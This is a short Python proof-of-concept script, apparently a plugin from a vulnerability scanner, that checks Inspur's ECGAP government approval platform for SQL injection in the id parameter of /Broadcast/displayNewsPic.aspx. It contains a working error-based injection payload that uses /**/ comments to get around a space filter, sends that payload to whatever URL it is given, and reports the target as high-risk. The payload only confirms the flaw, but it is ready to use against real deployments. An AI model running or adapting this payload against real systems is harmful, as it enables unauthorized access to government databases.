#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 浪潮ECGAP政务审批系统SQL注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-075562
author: Lucifer
description: 浪潮政务审批平台ECGAP /Broadcast/displayNewsPic.aspx文件中,参数id存在注入,过滤了空格,利用/**/绕过，同时过滤了@@version。
'''
import sys
import requests
import warnings
from termcolor import cprint

class inspur_ecgap_displayNewsPic_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/Broadcast/displayNewsPic.aspx?id=00187/**/and/**/1=CoNvErT(InT,ChAr(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73))"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"GAOJI" in req.text:
                cprint("[+]存在浪潮ECGAP政务审批系统SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = inspur_ecgap_displayNewsPic_sqli_BaseVerify(sys.argv[1])
    testVuln.run()